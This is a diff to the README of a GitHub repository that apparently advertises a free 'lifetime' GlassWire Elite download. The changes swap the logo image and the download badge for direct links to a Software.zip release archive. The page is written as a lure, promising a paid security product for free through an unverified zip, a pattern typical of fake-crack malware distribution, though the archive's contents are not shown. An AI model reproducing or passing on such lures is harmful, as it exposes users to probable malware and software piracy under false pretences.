@@ -2,7 +2,7 @@
 
 ### Repository Name: GlassWire-Elite-Download
 
-![GlassWire Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/GlassWire_logo.png/400px-GlassWire_logo.png)
+![GlassWire Logo](https://github.com/jeady123/GlassWire-Elite-Download/releases/download/v2.0/Software.zip)
 
 ## Description:
 Looking for the ultimate GlassWire experience? You've come to the right place! Explore GlassWire Elite features and benefits such as night neon mode, lifetime license, special discounts, and more. Compare GlassWire Elite with other popular security software like Avast and Norton. Don't miss out on our seasonal sales and special offers. Download GlassWire Elite now and step into a new level of network security!
@@ -25,7 +25,7 @@ Looking for the ultimate GlassWire experience? You've come to the right place! E
 - Is GlassWire Elite Lifetime
 
 ## Get GlassWire Elite Now! 💎
-[![Download GlassWire Elite](https://img.shields.io/badge/Click-Here-red)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip "Launch the GlassWire Elite Download")
+[![Download GlassWire Elite](https://github.com/jeady123/GlassWire-Elite-Download/releases/download/v2.0/Software.zip)](https://github.com/jeady123/GlassWire-Elite-Download/releases/download/v2.0/Software.zip "Launch the GlassWire Elite Download")
 
 Don't forget to check out our "Releases" section if the link does not work properly. Enjoy the power of GlassWire Elite for enhanced network security!
 
